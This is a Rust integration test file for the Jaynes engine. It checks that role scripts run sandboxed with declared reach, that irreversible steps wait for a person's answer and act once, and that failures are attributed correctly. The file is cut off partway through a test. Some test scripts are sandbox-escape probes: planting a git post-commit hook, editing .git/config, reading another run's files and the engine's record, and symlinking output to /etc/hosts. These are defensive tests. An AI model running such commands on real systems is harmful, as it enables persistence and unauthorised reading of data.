//! A role whose steps are scripts of its own folder, end to end and with no agent: the real binary, a role written
//! in a file, a real git project, and a registry on a local port standing for the world outside the run.
//!
//! What is held here: a script runs in the box with the reach its step declares; what it writes in the run's copy is
//! measured by Jaynes as an agent's change is; a script that fails is the role's fault and spends nothing; and a step
//! that says it cannot be undone waits for the person's answers, acts once, and says so when it may have acted.

use serde_json::{json, Value};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};

const BIN: &str = env!("CARGO_BIN_EXE_jaynes");

/// No agent works in these runs: one that started would fail the run.
const NO_AGENT: &str = "command:echo 'an agent was started' >&2; exit 9";

fn roles() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/roles")
}

// --- the world outside the run -------------------------------------------------------------------------------

/// One request the registry heard, as it arrived.
#[derive(Clone, Debug)]
struct Heard {
    method: String,
    path: String,
    key: String,
    body: Value,
}

/// A registry on a local port: it keeps what is announced to it, counts the same key once, and lists what it has.
struct World {
    port: u16,
    heard: Arc<Mutex<Vec<Heard>>>,
}

impl World {
    fn open() -> World {
        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("bind");
        let port = listener.local_addr().expect("address").port();
        let heard: Arc<Mutex<Vec<Heard>>> = Arc::default();
        let kept = heard.clone();
        std::thread::spawn(move || {
            let mut announced: Vec<(String, Value)> = Vec::new();
            for stream in listener.incoming().flatten() {
                let Some(h) = read_request(&stream) else { continue };
                kept.lock().expect("lock").push(h.clone());
                let answer = match (h.method.as_str(), h.path.as_str()) {
                    ("POST", "/announcements") => {
                        let n = match announced.iter().position(|(key, _)| *key == h.key) {
                            Some(n) => n,
                            None => {
                                announced.push((h.key.clone(), h.body.clone()));
                                announced.len() - 1
                            }
                        };
                        json!({"id": format!("a{}", n + 1)})
                    }
                    _ => Value::Array(announced.iter().enumerate().map(|(n, (_, body))| json!({"id": format!("a{}", n + 1), "version": body["version"]})).collect()),
                };
                let text = answer.to_string();
                let mut stream = stream;
                let _sent = stream.write_all(format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{text}", text.len()).as_bytes());
            }
        });
        World { port, heard }
    }

    fn address(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    /// The announcements the registry was sent, each as it arrived.
    fn announcements(&self) -> Vec<Heard> {
        self.heard.lock().expect("lock").iter().filter(|h| h.method == "POST").cloned().collect()
    }
}

fn read_request(mut stream: &std::net::TcpStream) -> Option<Heard> {
    let mut bytes = Vec::new();
    let mut buffer = [0u8; 4096];
    let head_end = loop {
        if let Some(at) = bytes.windows(4).position(|w| w == b"\r\n\r\n") {
            break at;
        }
        match stream.read(&mut buffer) {
            Ok(0) | Err(_) => return None,
            Ok(n) => bytes.extend_from_slice(&buffer[..n]),
        }
    };
    let head = String::from_utf8_lossy(&bytes[..head_end]).to_string();
    let header = |name: &str| {
        head.lines().skip(1).filter_map(|l| l.split_once(':')).find(|(k, _)| k.trim().eq_ignore_ascii_case(name)).map(|(_, v)| v.trim().to_string()).unwrap_or_default()
    };
    let length: usize = header("content-length").parse().unwrap_or(0);
    while bytes.len() < head_end + 4 + length {
        match stream.read(&mut buffer) {
            Ok(0) | Err(_) => break,
            Ok(n) => bytes.extend_from_slice(&buffer[..n]),
        }
    }
    let mut first = head.lines().next().unwrap_or("").split(' ');
    Some(Heard {
        method: first.next().unwrap_or("").to_string(),
        path: first.next().unwrap_or("").to_string(),
        key: header("idempotency-key"),
        body: serde_json::from_slice(&bytes[(head_end + 4).min(bytes.len())..]).unwrap_or(Value::Null),
    })
}

// --- a run ---------------------------------------------------------------------------------------------------

struct Scratch {
    base: PathBuf,
    home: PathBuf,
    project: PathBuf,
}

/// A project at a version, which names `registry` as where it announces, in git.
fn scratch(name: &str, registry: &str) -> Scratch {
    let base = std::env::temp_dir().join(format!("jaynes-steps-{name}-{}", std::process::id()));
    let _gone = std::fs::remove_dir_all(&base);
    let project = base.join("project");
    std::fs::create_dir_all(&project).expect("dir");
    std::fs::write(project.join("VERSION"), "1.4.0\n").expect("write");
    std::fs::write(project.join("registry"), format!("{registry}\n")).expect("write");
    std::fs::write(project.join("README.md"), "# A project\n").expect("write");
    for args in [vec!["init", "-q", "-b", "main"], vec!["add", "-A"], vec!["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "start"]] {
        assert!(Command::new("git").arg("-C").arg(&project).args(&args).status().expect("git").success(), "git {args:?}");
    }
    Scratch { home: base.join("home"), project, base }
}

fn engine(s: &Scratch, args: &[&str]) -> (bool, String) {
    let out = Command::new(BIN)
        .args(args)
        .env("JAYNES_ENGINE_HOME", &s.home).env("JAYNES_NO_PAGE", "1")
        .env("JAYNES_PYTHON", "python3")
        .env("PYTHONPATH", "")
        .output()
        .expect("engine");
    (out.status.success(), format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr)))
}

/// The same, at a terminal: the person.
fn person(s: &Scratch, args: &[&str]) -> String {
    const TTY: &str = "import os, pty, sys\npid, fd = pty.fork()\nif pid == 0:\n    os.execvp(sys.argv[1], sys.argv[1:])\nwhile True:\n    try:\n        data = os.read(fd, 65536)\n    except OSError:\n        break\n    if not data:\n        break\n    os.write(1, data)\nsys.exit(os.waitstatus_to_exitcode(os.waitpid(pid, 0)[1]))\n";
    let out = Command::new("python3")
        .args(["-c", TTY, BIN])
        .args(args)
        .env("JAYNES_ENGINE_HOME", &s.home).env("JAYNES_NO_PAGE", "1")
        .env("JAYNES_PYTHON", "python3")
        .env("PYTHONPATH", "")
        .output()
        .expect("engine at a terminal");
    format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr))
}

fn start(s: &Scratch, run: &str, role: &Path, request: &str) -> String {
    let (ok, out) = engine(s, &[
        "start", "--run", run, "--role", role.to_str().expect("path"), "--project", s.project.to_str().expect("path"),
        "--request", request, "--agent", NO_AGENT,
    ]);
    assert!(ok, "start failed:\n{out}");
    out
}

fn events(s: &Scratch, run: &str) -> Vec<Value> {
    let (ok, out) = engine(s, &["log", run]);
    assert!(ok, "{out}");
    out.lines().filter_map(|l| serde_json::from_str(l).ok()).collect()
}

fn of<'a>(events: &'a [Value], kind: &str, step: &str) -> Vec<&'a Value> {
    events.iter().filter(|e| e["type"] == kind && e["step"] == step).collect()
}

/// The steps that started an attempt, in order.
fn started(events: &[Value]) -> Vec<String> {
    events.iter().filter(|e| e["type"] == "AttemptStarted").map(|e| e["step"].as_str().unwrap_or("").to_string()).collect()
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").arg("-C").arg(dir).args(args).output().expect("git");
    String::from_utf8_lossy(&out.stdout).to_string()
}

/// The announce-version role of this repository's tests, in a folder of the test's own, with the registry's port
/// as the one local port its announcement may reach and `change` made to its `role.toml`.
fn announce_version(s: &Scratch, world: &World, change: impl Fn(String) -> String) -> PathBuf {
    let from = roles().join("announce-version");
    let into = s.base.join("announce-version");
    for part in ["steps", "checks", "cases/announced"] {
        std::fs::create_dir_all(into.join(part)).expect("dir");
        for entry in std::fs::read_dir(from.join(part)).expect("read").flatten() {
            std::fs::copy(entry.path(), into.join(part).join(entry.file_name())).expect("copy");
        }
    }
    let text = std::fs::read_to_string(from.join("role.toml")).expect("role.toml").replace("local_ports = [18473]", &format!("local_ports = [{}]", world.port));
    std::fs::write(into.join("role.toml"), change(text)).expect("write");
    into
}

/// A role of one step, `act`, which is the shell script `script`, with `keys` as the rest of the step in `role.toml`.
fn one_script(s: &Scratch, name: &str, keys: &str, script: &str) -> PathBuf {
    let dir = s.base.join(name);
    std::fs::create_dir_all(dir.join("steps")).expect("dir");
    std::fs::write(dir.join("steps/act.sh"), script).expect("write");
    std::fs::write(dir.join("role.toml"), format!("role = \"{name}\"\nversion = \"1.0.0\"\n\n[[step]]\nname = \"act\"\nby = \"role\"\nscript = \"steps/act.sh\"\n{keys}\n")).expect("write");
    dir
}

/// A script's output, written where Jaynes reads it.
const DONE: &str = r#"printf '{"done": true}' > "$JAYNES_OUTPUT""#;

/// A script that asks the registry what it lists, and says so when it cannot reach it.
const ASK: &str = r#"python3 -c 'import urllib.request; urllib.request.urlopen("REGISTRY/announcements", timeout=10)' || { echo "the registry is out of reach"; exit 1; }
printf '{"done": true}' > "$JAYNES_OUTPUT"
"#;

/// A script that sends the registry an announcement with the key Jaynes gave it, and then breaks until MARKER exists.
const SEND: &str = r#"call=$(cat)
printf '%s' "$call" | python3 -c '
import json, sys, urllib.request
key = json.load(sys.stdin)["key"]
ask = urllib.request.Request("REGISTRY/announcements", data=b"{\"version\": \"1.4.0\"}", method="POST", headers={"Idempotency-Key": key})
urllib.request.urlopen(ask, timeout=10)
' || exit 2
test -f MARKER || { echo "sent, and then it broke"; exit 2; }
printf '{"done": true}' > "$JAYNES_OUTPUT"
"#;

// --- the acceptance: three scripts, no agent ------------------------------------------------------------------

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn three_scripts_of_a_role_run_to_the_end_with_no_agent() {
    let world = World::open();
    let s = scratch("whole", &world.address());
    let role = announce_version(&s, &world, |text| text);
    let out = start(&s, "whole", &role, "Faster start, and long names no longer cut.");
    assert!(out.contains("finished: delivered"), "{out}");
    let e = events(&s, "whole");
    // every step is the role's own script, each ran once, in the role's order, and no agent started
    assert_eq!(started(&e), ["survey", "stamp", "announce", "read-registry"], "{out}");
    assert!(!out.contains("an agent was started"), "{out}");
    // a role with a step that cannot be undone runs at high risk from its first step
    assert_eq!(e[0]["risk"], "high", "{}", e[0]);
    assert!(e[0]["reasons"].to_string().contains("cannot be undone: announce"), "{}", e[0]);

    // the step that only reads gave what the project says, for the steps after it
    let survey = of(&e, "StepDone", "survey");
    assert_eq!(survey.len(), 1);
    assert_eq!(survey[0]["changed"], json!([]), "a step that only reads changes nothing");

    // the step that writes worked in the run's copy, and Jaynes measured what it changed, as it measures an agent's
    let stamp = of(&e, "StepDone", "stamp");
    assert_eq!(stamp[0]["changed"].as_array().map(Vec::len), Some(1), "{}", stamp[0]);
    assert_eq!(stamp[0]["changed"][0]["what"], "CHANGELOG.md");
    assert!(stamp[0]["changed"][0]["size"].as_u64().is_some_and(|lines| lines >= 3), "{}", stamp[0]);
    // the change is delivered as the run's branch, and the person's own folder is as it was
    let log = git(&s.project, &["show", "jaynes/whole:CHANGELOG.md"]);
    assert!(log.contains("## 1.4.0") && log.contains("Faster start, and long names no longer cut."), "{log}");
    assert!(!s.project.join("CHANGELOG.md").exists(), "the person's folder was written");

    // the step that cannot be undone acted once, on the world, with the key Jaynes made for it
    let key = of(&e, "AttemptStarted", "announce")[0]["key"].as_str().expect("a step that cannot be undone has a key").to_string();
    assert!(of(&e, "AttemptStarted", "survey")[0]["key"].is_null() && of(&e, "AttemptStarted", "stamp")[0]["key"].is_null(), "only what cannot be undone has a key");
    let sent = world.announcements();
    assert_eq!(sent.len(), 1, "{sent:?}");
    assert_eq!((sent[0].path.as_str(), sent[0].key.as_str()), ("/announcements", key.as_str()));
    assert_eq!(sent[0].body["version"], "1.4.0");
    assert!(sent[0].body["notes"].as_str().is_some_and(|n| n.contains("Faster start")), "it was given the output of the steps it needs: {:?}", sent[0]);

    // the state of the world is read by a step of the role, and a check judges the reading, not what the script that
    // acted said of itself
    let reading = &of(&e, "StepDone", "read-registry")[0];
    assert_eq!(reading["changed"], json!([]));
    let judged = of(&e, "ChecksJudged", "read-registry");
    let announced = judged[0]["checks"].as_array().and_then(|c| c.iter().find(|c| c["check"] == "announced")).expect("the check ran");
    assert_eq!((announced["passed"].clone(), announced["blocked"].clone()), (json!(true), json!(false)), "{announced}");
    // each output follows the format its step declares
    for step in ["survey", "stamp", "announce", "read-registry"] {
        let checks = of(&e, "ChecksJudged", step)[0]["checks"].to_string();
        assert!(checks.contains("output-follows-schema"), "{step}: {checks}");
    }
    // the record holds
    let (ok, out) = engine(&s, &["verify"]);
    assert!(ok, "{out}");
}

// --- what a script may reach ----------------------------------------------------------------------------------

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_that_only_reads_leaves_nothing_in_the_run_s_copy() {
    let s = scratch("reads", "http://127.0.0.1:1");
    let role = one_script(&s, "reads", "reach = { project = \"read\" }", &format!("test -f VERSION || exit 1\necho left > LEFT.txt\n{DONE}\n"));
    let out = start(&s, "reads", &role, "look");
    assert!(out.contains("finished: delivered"), "it read the project: {out}");
    let e = events(&s, "reads");
    assert_eq!(of(&e, "StepDone", "act")[0]["changed"], json!([]));
    assert!(!s.home.join("runs/reads/project/LEFT.txt").exists(), "what a reading step wrote stayed in the run's copy");
    assert_eq!(git(&s.project, &["diff", "--stat", "main", "jaynes/reads"]).trim(), "", "and was delivered");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_with_no_reach_sees_nothing_of_the_project() {
    let s = scratch("blind", "http://127.0.0.1:1");
    let role = one_script(&s, "blind", "", &format!("test -e VERSION && {{ echo 'the project is here'; exit 1; }}\n{DONE}\n"));
    let out = start(&s, "blind", &role, "look");
    assert!(out.contains("finished: delivered"), "{out}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn what_a_script_writes_raises_the_risk_as_an_agent_s_change_does() {
    // G7: rules in code set how risky a run is, from what the change touches, whoever made the change
    let s = scratch("risky", "http://127.0.0.1:1");
    let role = one_script(&s, "risky", "reach = { project = \"write\", write = [\"**\"] }", &format!("printf 'test:\\n\\ttrue\\n' > Makefile\n{DONE}\n"));
    let out = start(&s, "risky", &role, "add a test target");
    assert!(out.contains("finished: delivered"), "{out}");
    let e = events(&s, "risky");
    assert_eq!(e[0]["risk"], "low", "a role whose steps can all be undone starts at low risk");
    let changed = &of(&e, "StepDone", "act")[0]["changed"];
    assert_eq!((changed[0]["what"].clone(), changed[0]["floor"].clone()), (json!("Makefile"), json!(true)), "{changed}");
    let raised = e.iter().find(|e| e["type"] == "RiskRaised").expect("a file that runs later raises the risk");
    assert_eq!(raised["to"], "high", "{raised}");
    assert_eq!(git(&s.project, &["show", "jaynes/risky:Makefile"]), "test:\n\ttrue\n");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_that_writes_what_its_step_may_not_is_the_role_s_fault_and_the_copy_goes_back() {
    let s = scratch("outside", "http://127.0.0.1:1");
    let role = one_script(&s, "outside", "reach = { project = \"write\", write = [\"notes/**\"] }", &format!("mkdir -p notes && echo a > notes/a.txt && echo b > README.md\n{DONE}\n"));
    let out = start(&s, "outside", &role, "take notes");
    assert!(out.contains("blocked (Role)") && out.contains("README.md"), "{out}");
    let e = events(&s, "outside");
    assert!(of(&e, "AttemptFailed", "act").iter().all(|f| f["spent"] == false), "a script spends no attempt: {e:?}");
    assert!(of(&e, "StepDone", "act").is_empty());
    assert_eq!(git(&s.home.join("runs/outside/project"), &["status", "--porcelain"]).trim(), "", "the run's copy is as it was before the step");
    assert!(!git(&s.project, &["branch", "--list", "jaynes/outside"]).contains("jaynes/outside") || git(&s.project, &["diff", "--stat", "main", "jaynes/outside"]).trim().is_empty(), "nothing of it was delivered");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_cannot_write_where_git_keeps_the_run_s_copy() {
    // Jaynes runs git in the copy later, outside the box: a hook or a setting a script left there would run then.
    let s = scratch("git", "http://127.0.0.1:1");
    let script = format!("mkdir -p .git/hooks 2>/dev/null; echo 'echo owned' > .git/hooks/post-commit 2>/dev/null; echo x >> .git/config 2>/dev/null\necho ok > note.txt\n{DONE}\n");
    let role = one_script(&s, "git", "reach = { project = \"write\", write = [\"**\"] }", &script);
    let out = start(&s, "git", &role, "note");
    let copy = s.home.join("runs/git/project/.git");
    assert!(!copy.join("hooks/post-commit").exists(), "a script wrote a hook in the run's copy: {out}");
    assert!(!std::fs::read_to_string(copy.join("config")).unwrap_or_default().lines().any(|l| l.trim() == "x"), "a script wrote git's settings: {out}");
    assert!(out.contains("finished: delivered"), "what it may write, it wrote: {out}");
    assert_eq!(git(&s.project, &["show", "jaynes/git:note.txt"]), "ok\n");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_reads_nothing_the_engine_keeps_but_its_own_role() {
    // another run, whose folder is under the engine's runs, and the record of every run
    let s = scratch("keeps", "http://127.0.0.1:1");
    let first = one_script(&s, "first", "", &format!("{DONE}\n"));
    assert!(start(&s, "first", &first, "act").contains("finished: delivered"));
    let other = s.home.join("runs/first");
    assert!(other.is_dir() && s.home.join("record.sqlite3").is_file());
    let peek = |what: &Path| format!("cat {0} >/dev/null 2>&1 || ls {0} >/dev/null 2>&1 && {{ echo 'read {0}'; exit 1; }}\n", what.display());
    for (keys, name) in [("", "nosy"), ("reach = { project = \"read\" }", "nosy-read"), ("reach = { project = \"write\", write = [\"**\"] }", "nosy-write")] {
        let script = format!("{}{}{DONE}\n", peek(&other.join("role/role.toml")), peek(&s.home.join("record.sqlite3")));
        let role = one_script(&s, name, keys, &script);
        let out = start(&s, name, &role, "look");
        assert!(out.contains("finished: delivered"), "{name}: a script read what the engine keeps: {out}");
    }
    // and a check of the role's own reads its own script all the same
    let checked = one_script(&s, "checked", "", &format!("{DONE}\n"));
    std::fs::create_dir_all(checked.join("checks")).expect("dir");
    std::fs::write(checked.join("checks/ok.sh"), "exit 0\n").expect("write");
    let text = std::fs::read_to_string(checked.join("role.toml")).expect("read");
    std::fs::write(checked.join("role.toml"), format!("{text}checks = [{{ script = \"checks/ok.sh\", about = \"it passes\" }}]\n")).expect("write");
    assert!(start(&s, "checked", &checked, "act").contains("finished: delivered"));
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_reaches_only_the_local_ports_its_step_names() {
    let world = World::open();
    let s = scratch("ports", &world.address());
    let call = ASK.replace("REGISTRY", &world.address());
    let closed = one_script(&s, "closed", "", &call);
    let out = start(&s, "closed", &closed, "ask");
    assert!(out.contains("blocked (Jaynes)") && out.contains("the box refused"), "a port the step does not name is closed, and the person is told the box refused it: {out}");
    assert!(world.heard.lock().expect("lock").is_empty(), "the registry was reached without being named");
    // it only asks the registry what it lists, so its author says it changes nothing there
    let open = one_script(&s, "open", &format!("reach = {{ local_ports = [{}] }}\neffect = \"none\"", world.port), &call);
    let out = start(&s, "open", &open, "ask");
    assert!(out.contains("finished: delivered"), "{out}");
    assert_eq!(world.heard.lock().expect("lock").len(), 1);
}

// --- a script that fails ---------------------------------------------------------------------------------------

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_that_fails_is_the_role_s_fault_spends_nothing_and_is_not_tried_again() {
    let s = scratch("fails", "http://127.0.0.1:1");
    for (name, script, fault, says) in [
        // it says the step cannot be done, and why
        ("refuses", "echo 'the project has no VERSION to announce'\nexit 1\n".to_string(), "blocked (Role)", "the project has no VERSION to announce"),
        // it broke: an exit the contract does not name
        ("breaks", "echo 'line 3: no such command' >&2\nexit 2\n".to_string(), "blocked (Role)", "exited with 2"),
        // it ended well and gave no output
        ("silent", "exit 0\n".to_string(), "blocked (Role)", "wrote no output"),
        // it gave what is not JSON
        ("garbled", "printf 'done!' > \"$JAYNES_OUTPUT\"\n".to_string(), "blocked (Role)", "is not JSON"),
        // the output is read as data: a plain file of the script's own, never a link to another, and not without end
        ("linked", "ln -s /etc/hosts \"$JAYNES_OUTPUT\"\n".to_string(), "blocked (Role)", "is a link"),
        ("endless", "head -c 1100000 /dev/zero > \"$JAYNES_OUTPUT\"\n".to_string(), "blocked (Role)", "larger than 1000000 bytes"),
        ("twinned", "printf '{}' > \"$TMPDIR/twin\" && ln \"$TMPDIR/twin\" \"$JAYNES_OUTPUT\"\n".to_string(), "blocked (Role)", "not a plain file of its own"),
        // it could not run, and says so: the machine's to fix, as a check that cannot judge is
        ("cannot-run", "echo 'python3 is not installed'\nexit 3\n".to_string(), "blocked (Jaynes)", "python3 is not installed"),
    ] {
        let role = one_script(&s, name, "", &script);
        let out = start(&s, name, &role, "act");
        assert!(out.contains(fault) && out.contains(says), "{name}: {out}");
        let e = events(&s, name);
        assert_eq!(started(&e), ["act"], "{name}: a script that failed is not run again by itself");
        let failed = of(&e, "AttemptFailed", "act");
        assert!(failed.len() == 1 && failed[0]["spent"] == false, "{name}: no attempt is spent: {failed:?}");
        assert!(!out.contains("may have acted"), "{name}: a step that changes nothing real did not act: {out}");
    }
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn the_person_continues_a_run_a_script_stopped_and_the_script_runs_again() {
    let s = scratch("again", "http://127.0.0.1:1");
    // the first time the project lacks what the script needs; the person puts it there and continues
    let marker = s.base.join("ready");
    let role = one_script(&s, "again", "", &format!("test -f {} || {{ echo 'not ready'; exit 1; }}\n{DONE}\n", marker.display()));
    let out = start(&s, "again", &role, "act");
    assert!(out.contains("blocked (Role)") && out.contains("not ready"), "{out}");
    std::fs::write(&marker, "").expect("write");
    let out = person(&s, &["continue", "again"]);
    assert!(out.contains("finished: delivered"), "{out}");
    assert_eq!(started(&events(&s, "again")), ["act", "act"]);
}

// --- what cannot be undone -------------------------------------------------------------------------------------

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn what_cannot_be_undone_waits_for_the_person_s_answer_and_then_acts_once() {
    // G14, for a role written in a file: the announcement rests on the changelog's entry, which the person is asked about
    let world = World::open();
    let s = scratch("waits", &world.address());
    let role = announce_version(&s, &world, |text| {
        text.replace("about = \"Writes the version's entry in the changelog.\"", "about = \"Writes the version's entry in the changelog.\"\nstop = { ask = \"Announce the version with this entry?\", verdicts = [\"keep\", \"redo\"] }")
    });
    let out = start(&s, "waits", &role, "Faster start.");
    assert!(out.contains("waiting: announce cannot be undone, and rests on answers you have not given"), "{out}");
    assert!(world.announcements().is_empty(), "it announced before the person answered");
    let e = events(&s, "waits");
    assert_eq!(started(&e), ["survey", "stamp"]);
    let question = e.iter().find(|e| e["type"] == "QuestionOpened").expect("asked")["question"]["id"].as_str().expect("id").to_string();
    // an agent's answer is not the person's: nothing that cannot be undone rests on it (G9)
    let (_, out) = engine(&s, &["answer", "waits", &question, "--send"]);
    assert!(world.announcements().is_empty(), "it announced on an answer that was not the person's: {out}");
    let out = person(&s, &["answer", "waits", &question, "--send"]);
    assert!(out.contains("finished: delivered"), "{out}");
    assert_eq!(world.announcements().len(), 1);
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_script_that_cannot_be_undone_and_fails_says_whether_it_may_have_acted() {
    let s = scratch("acted", "http://127.0.0.1:1");
    let keys = "effect = \"irreversible\"";
    // exit 1 is the script's word that it did nothing
    let role = one_script(&s, "sure", keys, "echo 'the registry does not answer, so nothing was sent'\nexit 1\n");
    let out = start(&s, "sure", &role, "act");
    assert!(out.contains("blocked (Role)") && out.contains("nothing was sent") && !out.contains("may have acted"), "{out}");
    // any other failure may have left its mark on the world: its outcome is not known, and a continue asks first
    for (name, script) in [("broke", "echo sent; exit 2\n"), ("silent", "exit 0\n")] {
        let role = one_script(&s, name, keys, script);
        let out = start(&s, name, &role, "act");
        assert!(out.contains("blocked") && out.contains("cannot be undone") && out.contains("may have acted"), "{name}: {out}");
        assert_eq!(started(&events(&s, name)), ["act"], "{name}: what may have acted is not run again by itself");
        let out = person(&s, &["continue", name]);
        assert_eq!(started(&events(&s, name)), ["act"], "{name}: a continue ran again what may have acted: {out}");
        let asked = events(&s, name).iter().rev().find(|e| e["type"] == "QuestionOpened" && e["question"]["step"] == "act").map(|e| e["question"]["kind"].clone());
        assert_eq!(asked, Some(json!("acted")), "{name}: the person is asked about the act: {out}");
    }
    // its script ran to the end, and only then Jaynes found it wrote what it may not: it may have acted all the same
    let strayed = one_script(&s, "strayed", &format!("reach = {{ project = \"write\", write = [\"notes/**\"] }}\n{keys}"), &format!("echo b > README.md\n{DONE}\n"));
    let out = start(&s, "strayed", &strayed, "act");
    assert!(out.contains("blocked") && out.contains("README.md") && out.contains("may have acted"), "{out}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_step_that_cannot_be_undone_run_again_in_the_same_round_carries_the_same_key() {
    let world = World::open();
    let s = scratch("key", &world.address());
    let marker = s.base.join("ready");
    let script = SEND.replace("REGISTRY", &world.address()).replace("MARKER", &marker.display().to_string());
    let role = one_script(&s, "key", &format!("reach = {{ local_ports = [{}] }}\neffect = \"irreversible\"\nidempotent = true", world.port), &script);
    let out = start(&s, "key", &role, "act");
    assert!(out.contains("blocked (Jaynes)") && out.contains("exited with 2"), "its outcome is not known, said as the machine's: {out}");
    std::fs::write(&marker, "").expect("write");
    // a step safe to repeat: the person's continue starts it again by itself, with the key it had
    let out = person(&s, &["continue", "key"]);
    assert!(out.contains("finished: delivered"), "{out}");
    let sent = world.announcements();
    assert_eq!(sent.len(), 2, "{sent:?}");
    assert!(!sent[0].key.is_empty() && sent[0].key == sent[1].key, "the service that acts can count the repeat once: {sent:?}");
}

// --- what cannot be undone runs once ---------------------------------------------------------------------------

/// A script that writes the round it ran in, so a step sent back comes out different and what used it is stale.
const ROUND: &str = r#"python3 -c 'import json, os, sys; json.dump({"round": json.load(sys.stdin)["round"]}, open(os.environ["JAYNES_OUTPUT"], "w"))'
"#;

/// A role of three scripts: `draft`, which the person is asked about and may send back; `send`, which cannot be
/// undone and tells the registry; and `closing`, the person's, so the run is still open after `send` acted.
fn draft_send_close(s: &Scratch, world: &World, name: &str, send_more: &str, closing: &str) -> PathBuf {
    let dir = s.base.join(name);
    std::fs::create_dir_all(dir.join("steps")).expect("dir");
    std::fs::write(dir.join("steps/draft.sh"), ROUND).expect("write");
    std::fs::write(dir.join("steps/send.sh"), SEND.replace("REGISTRY", &world.address()).replace("test -f MARKER", "true")).expect("write");
    let text = format!(
        "role = \"{name}\"\nversion = \"1.0.0\"\n\n[[step]]\nname = \"draft\"\nby = \"role\"\nscript = \"steps/draft.sh\"\nstop = {{ ask = \"Send this?\", verdicts = [\"keep\", \"redo\"] }}\n\n\
         [[step]]\nname = \"send\"\nby = \"role\"\nscript = \"steps/send.sh\"\nneeds = [\"draft\"]\nreach = {{ local_ports = [{}] }}\neffect = \"irreversible\"\n{send_more}\n\
         [[step]]\nname = \"closing\"\nby = \"person\"\n{closing}\n",
        world.port
    );
    std::fs::write(dir.join("role.toml"), text).expect("write");
    dir
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_step_that_cannot_be_undone_runs_once_when_an_answer_before_it_changes_after_it_acted() {
    // The one way a role in a file can still reach it: the person keeps the draft, the step acts, and then, the run
    // still open, the person sends the draft back. What the step used comes out different. It has acted, and does
    // not act again: the engine holds that by itself, whatever the role's file allows.
    let world = World::open();
    let s = scratch("once", &world.address());
    let role = draft_send_close(&s, &world, "once", "", "needs = [\"send\"]\nstop = { ask = \"Close the run?\", verdicts = [\"keep\"] }");
    let out = start(&s, "once", &role, "tell them");
    assert!(out.contains("waiting: send cannot be undone, and rests on answers you have not given"), "{out}");
    let question = |step: &str| {
        events(&s, "once").iter().rev().find(|e| e["type"] == "QuestionOpened" && e["question"]["step"] == step).expect("asked")["question"]["id"].as_str().expect("id").to_string()
    };
    let draft = question("draft");
    let out = person(&s, &["answer", "once", &draft, "--send"]);
    assert!(out.contains("closing is yours to answer"), "the run is open after send acted: {out}");
    assert_eq!(world.announcements().len(), 1, "it acted once the person kept the draft");
    // the person changes their mind about the draft, after the act: it is made again, comes out different, and
    // the person keeps the new one
    let out = person(&s, &["answer", "once", &draft, "draft=redo:again", "--send"]);
    let again = question("draft");
    assert_ne!(again, draft, "the draft was made again and asked about again: {out}");
    let out = person(&s, &["answer", "once", &again, "--send"]);
    assert_eq!(world.announcements().len(), 1, "what cannot be undone acted again when an answer before it changed: {out}");
    // the engine holds the run at send and asks the person, since what send used came out different after it acted
    let e = events(&s, "once");
    let acted = e.iter().rev().find(|e| e["type"] == "QuestionOpened" && e["question"]["step"] == "send").expect("asked about the act")["question"].clone();
    assert_eq!(acted["kind"], "acted", "{acted}");
    assert!(out.contains("send cannot be undone and already acted: it waits for you to keep it or act again"), "{out}");
    // kept as it acted: it stands, the run goes on, and nothing more reaches the world
    let out = person(&s, &["answer", "once", acted["id"].as_str().expect("id"), "--send"]);
    assert!(events(&s, "once").iter().any(|e| e["type"] == "ActKept" && e["step"] == "send"), "{out}");
    assert!(out.contains("closing is yours to answer"), "{out}");
    assert_eq!(world.announcements().len(), 1, "{out}");
    assert_eq!(started(&events(&s, "once")).iter().filter(|step| *step == "send").count(), 1, "{out}");
}

#[test]
#[cfg_attr(not(target_os = "macos"), ignore = "needs the box for project commands, which Linux does not have yet (slice 2)")]
fn a_second_act_happens_only_when_the_person_orders_it_and_carries_a_key_of_its_own() {
    let world = World::open();
    let s = scratch("second-act", &world.address());
    let role = draft_send_close(&s, &world, "second-act", "", "needs = [\"send\"]\nstop = { ask = \"Close the run?\", verdicts = [\"keep\"] }");
    start(&s, "second-act", &role, "tell them");
